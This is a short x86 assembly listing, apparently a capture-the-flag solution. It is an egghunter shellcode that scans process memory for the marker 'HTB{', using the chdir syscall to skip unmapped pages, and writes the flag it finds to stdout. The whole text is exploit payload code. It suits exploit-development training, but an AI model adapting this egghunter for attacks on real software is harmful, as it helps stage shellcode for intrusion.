[BITS 32]
xor ebx, ebx            ; reset EBX registers
mul ebx                 ; reset EAX and EDX
xor ecx, ecx            ; reset ECX
mov ecx, 0x7b425448       ; load the egg in ecx, 0x7b425448 = HTB{

next_page:
        or dx, 0xfff            ; move to the next PAGESIZE forward of 4095 bytes (0xfff in hex)
                                ; can't use 4096 because the hex value is 0x1000 (NULL bytes)
hunter:
        inc edx                 ; add 1 to 4095 = 4096 bytes
        lea ebx, [edx + 4]      ; move to the next address
        mov eax, 0x0c            ; load the chdir syscall
        int 0x80                ; call the syscall
        cmp al, 0xf2            ; compare the result of the syscall with EFAULT value
        jz next_page            ; if the result is EFAULT move to the next PAGESIZE
        mov edi, edx            ; load value of edx in edi
        cmp [edi], ecx          ; compare the value of edi with egg
        jnz hunter              ; if not match, loop
        MOV ecx, edi
        MOV eax, 0x04 ; SYSCALL no - write
        MOV ebx, 1 ; fd - stdout
        MOV edx, 0x24 ; write length
        int 0x80